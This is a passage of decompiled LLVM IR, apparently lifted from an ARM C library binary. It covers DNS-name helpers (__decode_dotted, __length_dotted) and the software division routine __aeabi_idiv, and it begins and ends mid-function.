  br i1 %v2_19c4c, label %dec_label_pc_19c64, label %dec_label_pc_19c58

dec_label_pc_19c58:                               ; preds = %entry, %dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge
  %v0_19bf021 = phi i32 [ %v0_19c4c.pre, %dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge ], [ %tmp, %entry ]
  %v1_19c58 = inttoptr i32 %v0_19bf021 to i8*
  %v2_19c58 = load i8, i8* %v1_19c58, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19c5c = icmp eq i8 %v2_19c58, 0
  store i1 %v2_19c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19c5c, label %dec_label_pc_19c64, label %dec_label_pc_19bf0

dec_label_pc_19c64:                               ; preds = %dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge, %dec_label_pc_19c38, %dec_label_pc_19c58, %entry
  %v0_19c64 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_19c64 = icmp slt i32 %v0_19c64, 0
  store i1 %v1_19c64, i1* %cpsr_n.global-to-local, align 1
  %v2_19c64 = icmp eq i32 %v0_19c64, 0
  store i1 %v2_19c64, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_19c64, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_19c64
  %v5_19c6c = load i32, i32* %r7.global-to-local, align 4
  %v6_19c6c = add i32 %v5_19c6c, 1
  store i32 %v6_19c6c, i32* %r0.global-to-local, align 4
  %v7_19c70 = load i32, i32* @r6, align 4
  %v9_19c70 = add i32 %v7_19c70, %v5_19c6c
  %v10_19c70 = inttoptr i32 %v9_19c70 to i8*
  store i8 0, i8* %v10_19c70, align 1
  %v0_19c74.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_19c74.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_19c74.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_19c64, %bb
  %v2_19c74 = phi i1 [ %v2_19c74.pre, %bb ], [ false, %dec_label_pc_19c64 ]
  %v1_19c74 = phi i1 [ %v1_19c74.pre, %bb ], [ %v1_19c64, %dec_label_pc_19c64 ]
  %v0_19c74 = phi i1 [ %v0_19c74.pre, %bb ], [ %v2_19c64, %dec_label_pc_19c64 ]
  %v3_19c74 = xor i1 %v2_19c74, %v1_19c74
  %v4_19c74 = or i1 %v0_19c74, %v3_19c74
  br i1 %v4_19c74, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_19c74 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_19c74, i32* @r4, align 4
  store i32 %v6_19bd8, i32* @r5, align 4
  store i32 %v9_19bd8, i32* @r6, align 4
  %v25_19c74 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_19c74

.loopexit:                                        ; preds = %dec_label_pc_19c30, %dec_label_pc_19c0c, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_19c7c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_19c7c, i32* @r4, align 4
  store i32 %v6_19bd8, i32* @r5, align 4
  store i32 %v9_19bd8, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_19c64, { 0, 2, 1 }
  uselistorder i32 %v0_19c4c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_19c44, { 1, 0 }
  uselistorder i32 %v2_19c30, { 1, 0 }
  uselistorder i32 %v1_19c24, { 2, 0, 3, 1 }
  uselistorder i32 %v0_19c38, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_19c08, { 1, 0 }
  uselistorder i32 %v0_19bf8, { 0, 2, 1, 3 }
  uselistorder i1 %v2_19c4c20, { 1, 0 }
  uselistorder i32 %v9_19bd8, { 1, 0 }
  uselistorder i32 %v6_19bd8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 7, 2, 6, 3, 5, 4, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 (i8*)* @strlen, { 12, 26, 8, 11, 10, 9, 17, 16, 27, 25, 24, 23, 21, 22, 20, 19, 18, 15, 14, 13, 30, 29, 28, 7, 6, 1, 4, 5, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 5, 6, 1, 7, 2, 3, 4 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_19c64, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_19c58, { 1, 0 }
  uselistorder label %dec_label_pc_19c0c, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_19c80 = load i32, i32* @r4, align 4
  %v6_19c80 = load i32, i32* @r5, align 4
  %v0_19c84 = load i32, i32* @r0, align 4
  store i32 %v0_19c84, i32* %sl.global-to-local, align 4
  %v2_19c84 = icmp eq i32 %v0_19c84, 0
  br i1 %v2_19c84, label %.thread16, label %dec_label_pc_19d24.preheader

.thread16:                                        ; preds = %entry
  %v0_19c901 = load i32, i32* @r2, align 4
  store i32 %v0_19c901, i32* %sb.global-to-local, align 4
  %v0_19c942 = load i32, i32* @r3, align 4
  store i32 %v0_19c942, i32* %stack_var_-40, align 4
  br label %dec_label_pc_19d44

dec_label_pc_19d24.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_19c90 = load i32, i32* @r2, align 4
  store i32 %v0_19c90, i32* %sb.global-to-local, align 4
  %v0_19c94 = load i32, i32* @r3, align 4
  store i32 %v0_19c94, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_19d243952 = load i32, i32* @r1, align 4
  %v2_19d244053 = add i32 %v1_19d243952, %v0_19c84
  %v3_19d244154 = inttoptr i32 %v2_19d244053 to i8*
  %v4_19d244255 = load i8, i8* %v3_19d244154, align 1
  %v6_19d244356 = zext i8 %v4_19d244255 to i32
  store i32 %v6_19d244356, i32* @r4, align 4
  %v2_19d284457 = icmp eq i8 %v4_19d244255, 0
  br i1 %v2_19d284457, label %bb35, label %dec_label_pc_19ca8.lr.ph

dec_label_pc_19ca8:                               ; preds = %dec_label_pc_19ca8.lr.ph, %bb30
  %v2_19d3050 = phi i1 [ %v2_19d304663, %dec_label_pc_19ca8.lr.ph ], [ true, %bb30 ]
  %v6_19d2448 = phi i32 [ %v6_19d244361, %dec_label_pc_19ca8.lr.ph ], [ %v6_19d24, %bb30 ]
  %v1_19d2447 = phi i32 [ %v1_19d243960, %dec_label_pc_19ca8.lr.ph ], [ %v5_19cd0, %bb30 ]
  %v1_19cac = and i32 %v6_19d2448, 192
  br i1 %v2_19d3050, label %bb28, label %bb

bb:                                               ; preds = %dec_label_pc_19ca8
  %v1_19cb0 = load i32, i32* %r8.global-to-local, align 4
  %v2_19cb0 = add i32 %v1_19cb0, 1
  store i32 %v2_19cb0, i32* %r8.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_19ca8, %bb
  %v2_19cb4 = icmp eq i32 %v1_19cac, 192
  %v1_19cb8 = add i32 %v1_19d2447, 1
  store i32 %v1_19cb8, i32* @r5, align 4
  br i1 %v2_19cb4, label %dec_label_pc_19cc0, label %dec_label_pc_19ce0

dec_label_pc_19cc0:                               ; preds = %bb28
  %v2_19cc0 = add i32 %v1_19cb8, %v0_19cc0.ph59
  %v3_19cc0 = inttoptr i32 %v2_19cc0 to i8*
  %v4_19cc0 = load i8, i8* %v3_19cc0, align 1
  %v6_19cc0 = zext i8 %v4_19cc0 to i32
  %v1_19cc8 = urem i32 %v6_19d2448, 64
  br i1 %v2_19d3050, label %bb30, label %bb29

bb29:                                             ; preds = %dec_label_pc_19cc0
  %v1_19ccc = load i32, i32* %r8.global-to-local, align 4
  %v2_19ccc = add i32 %v1_19ccc, 1
  store i32 %v2_19ccc, i32* %r8.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %dec_label_pc_19cc0, %bb29
  %v4_19cd0 = mul nuw nsw i32 %v1_19cc8, 256
  %v5_19cd0 = or i32 %v6_19cc0, %v4_19cd0
  store i32 %v5_19cd0, i32* %r1.global-to-local, align 4
  store i32 %storemerge17.ph58, i32* %r7.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_19d24 = add i32 %v5_19cd0, %v0_19cc0.ph59
  %v3_19d24 = inttoptr i32 %v2_19d24 to i8*
  %v4_19d24 = load i8, i8* %v3_19d24, align 1
  %v6_19d24 = zext i8 %v4_19d24 to i32
  store i32 %v6_19d24, i32* @r4, align 4
  %v2_19d28 = icmp eq i8 %v4_19d24, 0
  br i1 %v2_19d28, label %dec_label_pc_19d30.bb36_crit_edge, label %dec_label_pc_19ca8

dec_label_pc_19ce0:                               ; preds = %bb28
  %v2_19ce0 = add i32 %v6_19d2448, %storemerge17.ph58
  store i32 %v2_19ce0, i32* %r6.global-to-local, align 4
  %v2_19ce4 = load i32, i32* %stack_var_-40, align 4
  %v1_19ce8 = add i32 %v2_19ce0, 1
  store i32 %v1_19ce8, i32* %r7.global-to-local, align 4
  %v3_19cec = icmp ult i32 %v1_19ce8, %v2_19ce4
  br i1 %v3_19cec, label %dec_label_pc_19cf4, label %dec_label_pc_19d44

dec_label_pc_19cf4:                               ; preds = %dec_label_pc_19ce0
  %v2_19cf4 = add i32 %v1_19cb8, %v0_19cc0.ph59
  store i32 %v2_19cf4, i32* @r1, align 4
  %v0_19cf8 = load i32, i32* %sb.global-to-local, align 4
  %v2_19cf8 = add i32 %v0_19cf8, %storemerge17.ph58
  store i32 %v2_19cf8, i32* @r0, align 4
  store i32 %v6_19d2448, i32* @r2, align 4
  %v0_19d00 = call i32 @memcpy()
  %v0_19d04 = load i32, i32* @r5, align 4
  %v1_19d04 = load i32, i32* @r4, align 4
  %v2_19d04 = add i32 %v1_19d04, %v0_19d04
  store i32 %v2_19d04, i32* %r1.global-to-local, align 4
  %v0_19d08 = load i32, i32* %sl.global-to-local, align 4
  %v2_19d08 = add i32 %v0_19d08, %v2_19d04
  %v3_19d08 = inttoptr i32 %v2_19d08 to i8*
  %v4_19d08 = load i8, i8* %v3_19d08, align 1
  %v0_19d0c = load i32, i32* %fp.global-to-local, align 4
  %v2_19d0c = icmp eq i32 %v0_19d0c, 0
  br i1 %v2_19d0c, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_19cf4
  %v1_19d10 = load i32, i32* %r8.global-to-local, align 4
  %v3_19d10 = add i32 %v1_19d10, %v1_19d04
  store i32 %v3_19d10, i32* %r8.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_19cf4, %bb31
  %v2_19d14 = icmp eq i8 %v4_19d08, 0
  br i1 %v2_19d14, label %bb34, label %bb33

bb33:                                             ; preds = %bb32
  br label %bb34

bb34:                                             ; preds = %bb32, %bb33
  %v0_19d1c.off0 = phi i8 [ 0, %bb32 ], [ 46, %bb33 ]
  %v2_19d1c = load i32, i32* %sb.global-to-local, align 4
  %v3_19d1c = load i32, i32* %r6.global-to-local, align 4
  %v4_19d1c = add i32 %v3_19d1c, %v2_19d1c
  %v5_19d1c = inttoptr i32 %v4_19d1c to i8*
  store i8 %v0_19d1c.off0, i8* %v5_19d1c, align 1
  %v0_19d20.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_19d24.pre.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_19d30.pre.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_19d2439 = load i32, i32* %r1.global-to-local, align 4
  %v2_19d2440 = add i32 %v1_19d2439, %v0_19d24.pre.pre
  %v3_19d2441 = inttoptr i32 %v2_19d2440 to i8*
  %v4_19d2442 = load i8, i8* %v3_19d2441, align 1
  %v6_19d2443 = zext i8 %v4_19d2442 to i32
  store i32 %v6_19d2443, i32* @r4, align 4
  %v2_19d2844 = icmp eq i8 %v4_19d2442, 0
  %v2_19d3046 = icmp eq i32 %v0_19d30.pre.pre, 0
  br i1 %v2_19d2844, label %dec_label_pc_19d30, label %dec_label_pc_19ca8.lr.ph

dec_label_pc_19ca8.lr.ph:                         ; preds = %dec_label_pc_19d24.preheader, %bb34
  %v2_19d304663 = phi i1 [ %v2_19d3046, %bb34 ], [ false, %dec_label_pc_19d24.preheader ]
  %v6_19d244361 = phi i32 [ %v6_19d2443, %bb34 ], [ %v6_19d244356, %dec_label_pc_19d24.preheader ]
  %v1_19d243960 = phi i32 [ %v1_19d2439, %bb34 ], [ %v1_19d243952, %dec_label_pc_19d24.preheader ]
  %v0_19cc0.ph59 = phi i32 [ %v0_19d24.pre.pre, %bb34 ], [ %v0_19c84, %dec_label_pc_19d24.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_19d20.pre, %bb34 ], [ 0, %dec_label_pc_19d24.preheader ]
  br label %dec_label_pc_19ca8

dec_label_pc_19d30:                               ; preds = %bb34
  br i1 %v2_19d3046, label %dec_label_pc_19d30.bb36_crit_edge, label %bb35

dec_label_pc_19d30.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_19d30
  %v0_19d38.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19d44

bb35:                                             ; preds = %dec_label_pc_19d24.preheader, %dec_label_pc_19d30
  %v1_19d34 = load i32, i32* %r8.global-to-local, align 4
  %v2_19d34 = add i32 %v1_19d34, 1
  store i32 %v2_19d34, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_19d44

dec_label_pc_19d44:                               ; preds = %dec_label_pc_19ce0, %bb35, %dec_label_pc_19d30.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_19d38.pre, %dec_label_pc_19d30.bb36_crit_edge ], [ %v2_19d34, %bb35 ], [ -1, %dec_label_pc_19ce0 ]
  store i32 %v3_19c80, i32* @r4, align 4
  store i32 %v6_19c80, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_19cc0.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_19d24, { 1, 0 }
  uselistorder i32 %v5_19cd0, { 0, 2, 1 }
  uselistorder i32 %v6_19d2448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_19d3050, { 1, 0 }
  uselistorder i32 %v0_19c84, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 17, 16, 4, 15, 14, 13, 12, 2, 8, 7, 1, 0, 3, 11, 6, 5, 20, 21, 19, 18, 10, 9 }
  uselistorder i32 64, { 0, 8, 4, 5, 6, 1, 2, 11, 12, 7, 3, 9, 10, 14, 13 }
  uselistorder label %dec_label_pc_19d44, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_19d30.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_19ca8.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_19d50 = load i32, i32* @r0, align 4
  store i32 %v0_19d50, i32* @lr, align 4
  %v2_19d50 = icmp eq i32 %v0_19d50, 0
  br i1 %v2_19d50, label %bb, label %dec_label_pc_19d68

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_19d60:                               ; preds = %dec_label_pc_19d70
  %v1_19d60 = add i32 %v1_19d78, 2
  br label %dec_label_pc_19d90

dec_label_pc_19d68:                               ; preds = %entry
  %v0_19d68 = load i32, i32* @r1, align 4
  br label %dec_label_pc_19d78

dec_label_pc_19d70:                               ; preds = %dec_label_pc_19d78
  %v1_19d84 = and i32 %v6_19d78, 192
  %v2_19d88 = add i32 %v6_19d78, %v1_19d7c
  %v2_19d70 = icmp eq i32 %v1_19d84, 192
  br i1 %v2_19d70, label %dec_label_pc_19d60, label %dec_label_pc_19d78

dec_label_pc_19d78:                               ; preds = %dec_label_pc_19d70, %dec_label_pc_19d68
  %v1_19d78 = phi i32 [ %v2_19d88, %dec_label_pc_19d70 ], [ %v0_19d68, %dec_label_pc_19d68 ]
  %v2_19d78 = add i32 %v1_19d78, %v0_19d50
  %v3_19d78 = inttoptr i32 %v2_19d78 to i8*
  %v4_19d78 = load i8, i8* %v3_19d78, align 1
  %v6_19d78 = zext i8 %v4_19d78 to i32
  %v1_19d7c = add i32 %v1_19d78, 1
  %v2_19d80 = icmp eq i8 %v4_19d78, 0
  br i1 %v2_19d80, label %dec_label_pc_19d90, label %dec_label_pc_19d70

dec_label_pc_19d90:                               ; preds = %dec_label_pc_19d78, %dec_label_pc_19d60
  %v1_19d90 = phi i32 [ %v1_19d60, %dec_label_pc_19d60 ], [ %v1_19d7c, %dec_label_pc_19d78 ]
  %v2_19d90 = sub i32 %v1_19d90, %v0_19d68
  ret i32 %v2_19d90

; uselistorder directives
  uselistorder i32 %v6_19d78, { 1, 0 }
  uselistorder i32 %v1_19d78, { 2, 1, 0 }
  uselistorder i32 %v0_19d50, { 0, 2, 1 }
  uselistorder i8 0, { 65, 17, 25, 26, 66, 16, 22, 67, 47, 71, 69, 46, 70, 68, 45, 40, 9, 10, 72, 73, 77, 78, 24, 61, 62, 74, 75, 76, 15, 79, 41, 48, 81, 0, 80, 49, 42, 82, 83, 84, 85, 86, 87, 11, 52, 91, 1, 89, 88, 50, 2, 90, 51, 3, 92, 93, 27, 4, 95, 94, 53, 96, 97, 98, 99, 43, 100, 102, 103, 101, 12, 13, 14, 104, 5, 28, 105, 18, 106, 107, 19, 63, 29, 30, 6, 108, 109, 110, 112, 113, 114, 115, 111, 44, 116, 117, 118, 119, 120, 20, 31, 32, 33, 34, 35, 121, 122, 36, 23, 7, 8, 124, 123, 37, 125, 126, 38, 127, 54, 21, 128, 129, 130, 131, 133, 55, 134, 135, 132, 136, 137, 138, 139, 141, 140, 142, 64, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 159, 158, 160, 56, 162, 161, 39, 163, 57, 164, 166, 167, 165, 58, 168, 169, 60, 170, 59, 171, 172, 173, 174, 175, 176, 177, 178 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 3 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_19d98 = icmp slt i32 %arg2, 0
  %v2_19d98 = icmp eq i32 %arg2, 0
  %v0_19d9c = load i32, i32* @r0, align 4
  %v2_19d9c = xor i32 %v0_19d9c, %arg2
  br i1 %v2_19d98, label %dec_label_pc_19eb0, label %dec_label_pc_19da4

dec_label_pc_19da4:                               ; preds = %entry
  br i1 %v1_19d98, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_19da4
  %v2_19da4 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_19da4, %bb
  %v1_19e70 = phi i32 [ %v2_19da4, %bb ], [ %arg2, %dec_label_pc_19da4 ]
  %v1_19da8 = add i32 %v1_19e70, -1
  %v7_19da8 = icmp eq i32 %v1_19e70, 1
  br i1 %v7_19da8, label %dec_label_pc_19e50, label %dec_label_pc_19db0

dec_label_pc_19db0:                               ; preds = %thread-pre-split
  %v1_19db0 = icmp slt i32 %v0_19d9c, 0
  br i1 %v1_19db0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_19db0
  %v2_19db4 = sub i32 0, %v0_19d9c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_19db0, %bb85
  %v0_19ea4 = phi i32 [ %v0_19d9c, %dec_label_pc_19db0 ], [ %v2_19db4, %bb85 ]
  %v3_19db8 = icmp uge i32 %v0_19ea4, %v1_19e70
  %v9_19db8 = icmp eq i32 %v0_19ea4, %v1_19e70
  %v2_19dbc = xor i1 %v3_19db8, true
  %v3_19dbc = or i1 %v9_19db8, %v2_19dbc
  br i1 %v3_19dbc, label %dec_label_pc_19e5c, label %dec_label_pc_19dc0

dec_label_pc_19dc0:                               ; preds = %bb86
  %v2_19dc0 = and i32 %v1_19da8, %v1_19e70
  %v4_19dc0 = icmp eq i32 %v2_19dc0, 0
  br i1 %v4_19dc0, label %dec_label_pc_19e6c, label %dec_label_pc_19dc8

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19dc0
  %v3_19dc8 = icmp ult i32 %v1_19e70, 536870912
  br i1 %v3_19dc8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_19dc8
  %v4_19dcc = mul i32 %v1_19e70, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_19dc8, %.thread
  %v0_19dec.pr40.ph = phi i32 [ %v4_19dcc, %.thread ], [ %v1_19e70, %dec_label_pc_19dc8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_19dc8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_19dec.pr40 = phi i32 [ %v4_19de0, %bb89 ], [ %v0_19dec.pr40.ph, %.preheader.preheader ]
  %v1_19de4 = phi i32 [ %v4_19de4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_19dd8 = icmp ugt i32 %v0_19dec.pr40, 268435455
  br i1 %v2_19dd8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_19decthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_19ddc = icmp ult i32 %v0_19dec.pr40, %v0_19ea4
  br i1 %v4_19ddc, label %bb88, label %dec_label_pc_19decthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_19de0 = and i32 %v0_19dec.pr40, 268435456
  %v3_19de0 = icmp eq i32 %v2_19de0, 0
  %v4_19de0 = mul i32 %v0_19dec.pr40, 16
  br i1 %v3_19de0, label %bb89, label %dec_label_pc_19dec.loopexit

bb89:                                             ; preds = %bb88
  %v2_19de4 = and i32 %v1_19de4, 268435456
  %v3_19de4 = icmp eq i32 %v2_19de4, 0
  %v4_19de4 = mul i32 %v1_19de4, 16
  br i1 %v3_19de4, label %.preheader, label %dec_label_pc_19decthread-pre-split.loopexit.loopexit

dec_label_pc_19decthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_19df852.ph = phi i32 [ %v1_19de4, %bb87 ], [ %v4_19de4, %bb89 ]
  %v0_19dec.pr42.ph = phi i32 [ %v0_19dec.pr40, %bb87 ], [ %v4_19de0, %bb89 ]
  br label %dec_label_pc_19decthread-pre-split.loopexit

dec_label_pc_19decthread-pre-split.loopexit:      ; preds = %dec_label_pc_19decthread-pre-split.loopexit.loopexit, %.thread3
  %v1_19df852 = phi i32 [ %v1_19de4, %.thread3 ], [ %v1_19df852.ph, %dec_label_pc_19decthread-pre-split.loopexit.loopexit ]
  %v0_19dec.pr42 = phi i32 [ %v0_19dec.pr40, %.thread3 ], [ %v0_19dec.pr42.ph, %dec_label_pc_19decthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_19decthread-pre-split

dec_label_pc_19decthread-pre-split:               ; preds = %dec_label_pc_19decthread-pre-split.loopexit, %bb91
  %v1_19df850 = phi i32 [ %v1_19df852, %dec_label_pc_19decthread-pre-split.loopexit ], [ %v3_19df8, %bb91 ]
  %v2_19df048 = phi i32 [ %v0_19ea4, %dec_label_pc_19decthread-pre-split.loopexit ], [ %v2_19df0, %bb91 ]
  %v0_19dec.pr = phi i32 [ %v0_19dec.pr42, %dec_label_pc_19decthread-pre-split.loopexit ], [ %v3_19df4, %bb91 ]
  br label %dec_label_pc_19dec

dec_label_pc_19dec.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_19dec

dec_label_pc_19dec:                               ; preds = %dec_label_pc_19dec.loopexit, %dec_label_pc_19decthread-pre-split
  %v1_19df8 = phi i32 [ %v1_19df850, %dec_label_pc_19decthread-pre-split ], [ %v1_19de4, %dec_label_pc_19dec.loopexit ]
  %v2_19df0 = phi i32 [ %v2_19df048, %dec_label_pc_19decthread-pre-split ], [ %v0_19ea4, %dec_label_pc_19dec.loopexit ]
  %v1_19df4 = phi i32 [ %v0_19dec.pr, %dec_label_pc_19decthread-pre-split ], [ %v4_19de0, %dec_label_pc_19dec.loopexit ]
  %v2_19dec = icmp slt i32 %v1_19df4, 0
  br i1 %v2_19dec, label %dec_label_pc_19e00, label %bb90

bb90:                                             ; preds = %dec_label_pc_19dec
  %v4_19df0 = icmp ult i32 %v1_19df4, %v2_19df0
  br i1 %v4_19df0, label %bb91, label %dec_label_pc_19e00

bb91:                                             ; preds = %bb90
  %v3_19df4 = mul i32 %v1_19df4, 2
  %v2_19df8 = icmp slt i32 %v1_19df8, 0
  %v3_19df8 = mul i32 %v1_19df8, 2
  br i1 %v2_19df8, label %dec_label_pc_19e00, label %dec_label_pc_19decthread-pre-split

dec_label_pc_19e00:                               ; preds = %bb90, %dec_label_pc_19dec, %bb91
  %v2_19e0c63 = phi i32 [ %v3_19df8, %bb91 ], [ %v1_19df8, %bb90 ], [ %v1_19df8, %dec_label_pc_19dec ]
  %v1_19e0455 = phi i32 [ %v3_19df4, %bb91 ], [ %v1_19df4, %bb90 ], [ %v1_19df4, %dec_label_pc_19dec ]
  br label %dec_label_pc_19e04

dec_label_pc_19e04:                               ; preds = %.thread13, %dec_label_pc_19e00
  %v1_19e38 = phi i32 [ %v4_19e38, %.thread13 ], [ %v2_19e0c63, %dec_label_pc_19e00 ]
  %v1_19e0c = phi i32 [ %v1_19e48, %.thread13 ], [ 0, %dec_label_pc_19e00 ]
  %v1_19e3c = phi i32 [ %v4_19e3c, %.thread13 ], [ %v1_19e0455, %dec_label_pc_19e00 ]
  %v1_19e08 = phi i32 [ %v0_19e34, %.thread13 ], [ %v0_19ea4, %dec_label_pc_19e00 ]
  %v3_19e04 = icmp ult i32 %v1_19e08, %v1_19e3c
  br i1 %v3_19e04, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_19e04
  %v3_19e08 = sub i32 %v1_19e08, %v1_19e3c
  %v3_19e0c = or i32 %v1_19e0c, %v1_19e38
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_19e04, %bb92
  %v1_19e14 = phi i32 [ %v1_19e08, %dec_label_pc_19e04 ], [ %v3_19e08, %bb92 ]
  %v1_19e18 = phi i32 [ %v1_19e0c, %dec_label_pc_19e04 ], [ %v3_19e0c, %bb92 ]
  %v4_19e10 = udiv i32 %v1_19e3c, 2
  %v6_19e10 = icmp ult i32 %v1_19e14, %v4_19e10
  br i1 %v6_19e10, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_19e14 = urem i32 %v1_19e3c, 2
  %v4_19e14 = icmp eq i32 %v3_19e14, 0
  %v6_19e14 = sub i32 %v1_19e14, %v4_19e10
  br i1 %v4_19e14, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_19e18 = udiv i32 %v1_19e38, 2
  %v6_19e18 = or i32 %v1_19e18, %v5_19e18
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_19e20 = phi i32 [ %v6_19e14, %bb93 ], [ %v1_19e14, %.thread8 ], [ %v6_19e14, %bb94 ]
  %v1_19e24 = phi i32 [ %v1_19e18, %bb93 ], [ %v1_19e18, %.thread8 ], [ %v6_19e18, %bb94 ]
  %v4_19e1c = udiv i32 %v1_19e3c, 4
  %v6_19e1c = icmp ult i32 %v1_19e20, %v4_19e1c
  br i1 %v6_19e1c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_19e20 = and i32 %v1_19e3c, 2
  %v4_19e20 = icmp eq i32 %v3_19e20, 0
  %v6_19e20 = sub i32 %v1_19e20, %v4_19e1c
  br i1 %v4_19e20, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_19e24 = udiv i32 %v1_19e38, 4
  %v6_19e24 = or i32 %v1_19e24, %v5_19e24
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_19e2c = phi i32 [ %v6_19e20, %bb95 ], [ %v1_19e20, %.thread9 ], [ %v6_19e20, %bb96 ]
  %v1_19e30 = phi i32 [ %v1_19e24, %bb95 ], [ %v1_19e24, %.thread9 ], [ %v6_19e24, %bb96 ]
  %v4_19e28 = udiv i32 %v1_19e3c, 8
